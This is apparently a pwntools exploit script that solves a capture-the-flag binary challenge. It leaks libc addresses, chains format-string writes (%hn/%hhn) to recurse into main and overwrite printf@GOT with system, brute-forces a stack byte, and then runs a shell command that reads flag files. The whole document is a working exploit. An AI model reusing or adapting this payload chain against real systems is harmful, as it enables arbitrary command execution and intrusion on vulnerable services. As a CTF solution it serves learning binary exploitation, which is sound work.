#!/usr/bin/env python3
from pwn import *
import re
import sys

HOST = "ctf.taz.tn"
PORT = 10013

context.binary = ELF("./main", checksec=False)
context.log_level = "info"

elf = context.binary
libc = ELF("./libc.so.6", checksec=False)

PROMPT = b"Whaat's your naame?\nWhaat?\nWhaaat iss your naaame?\n"
PRINTF_GOT = elf.got["printf"]


def pad_to(cur: int, target: int, bits: int) -> int:
    mod = 1 << bits
    delta = (target - cur) % mod
    return delta or mod


def build_stage1(guess_low: int) -> bytes:
    # Leak arg7, then use arg44 -> arg52 to recurse into main+9.
    count = 9
    s = "%c" * 6 + "|%p|"
    count += 6 + 16

    s += "%c" * 35
    count += 35

    p = pad_to(count % 256, (guess_low + 8) & 0xFF, 8)
    s += f"%{p}c%hhn"
    count += p

    s += "%c" * 6
    count += 6

    p = pad_to(count % 256, 0xCD, 8)
    s += f"%{p}c%hhn"
    return s.encode()


def build_prep_arg61(rbp: int) -> bytes:
    # Keep arg52 writing saved_rip, and use arg54 -> arg56 -> arg61 to make
    # arg61 point at printf@got for the next call.
    count = 9
    s = "%c" * 50
    count += 50

    p = pad_to(count % 65536, 0x12CD, 16)
    s += f"%{p}c%hn"
    count += p

    p = pad_to(count % 65536, (rbp + 0x38) & 0xFFFF, 16)
    s += f"%{p}c%hn"
    count += p

    p = pad_to(count % 65536, PRINTF_GOT & 0xFFFF, 16)
    s += f"%{p}c%hn"
    count += p

    payload = s.encode()
    assert len(payload) < 0x96
    return payload


def build_write_arg61(system_addr: int) -> bytes:
    # Recurse again via arg52, then arg60 -> arg61 overwrites printf@got low16.
    count = 9
    s = "%c" * 50
    count += 50

    p = pad_to(count % 65536, 0x12CD, 16)
    s += f"%{p}c%hn"
    count += p

    s += "%c" * 7
    count += 7

    p = pad_to(count % 65536, system_addr & 0xFFFF, 16)
    s += f"%{p}c%hn"
    count += p

    payload = s.encode()
    assert len(payload) < 0x96
    return payload


def recv_prompt(io, timeout: float = 10.0) -> bytes:
    return io.recvuntil(PROMPT)


def parse_leak(line: bytes) -> int:
    return int(line.rsplit(b" ", 1)[1])


def attempt_guess(guess_low: int) -> bytes | None:
    #io = remote(HOST, PORT)
    io = process("./main")
    context.terminal="xterm" #adjust this with ur terminal
    gdb.attach(io,"b* vuln + 151")
    try:
        line = io.recvline(timeout=5)
        if not line:
            return None

        puts_addr = parse_leak(line.strip())
        base = puts_addr - libc.sym["puts"]
        system_addr = base + libc.sym["system"]
        printf_addr = base + libc.sym["printf"]

        # Low-16 overwrite only works when everything above the low 16 bits matches.
        if (printf_addr >> 16) != (system_addr >> 16):
            io.close()
            return None

        recv_prompt(io)

        io.sendline(build_stage1(guess_low))
        data = recv_prompt(io)
        m = re.search(rb"\|(0x[0-9a-fA-F]+)\|", data)
        if not m:
            return None

        rbp = int(m.group(1), 16) + 8

        io.sendline(build_prep_arg61(rbp))
        recv_prompt(io)

        io.sendline(build_write_arg61(system_addr))
        recv_prompt(io)

        # One-shot command so we do not depend on an interactive shell.
        cmd = (
            b";find / -maxdepth 3 -iname 'flag*' "
            b"-exec cat {} + 2>/dev/null; echo __DONE__;#"
        )
        io.sendline(cmd)
        out = io.recvrepeat(5.0)
        if b"__DONE__" not in out:
            return None
        return out
    except EOFError:
        pass
    finally:
        try:
            io.close()
        except Exception:
            pass
    return None


def main() -> int:
    tries = int(sys.argv[1]) if len(sys.argv) > 1 else 200
    for i in range(1, tries + 1):
        guess = ((i - 1) % 16) << 4
        log.info("attempt %d/%d guess=%#x", i, tries, guess)
        out = attempt_guess(guess)
        if out:
            sys.stdout.buffer.write(out)
            return 0
    return 1


if __name__ == "__main__":
    raise SystemExit(main())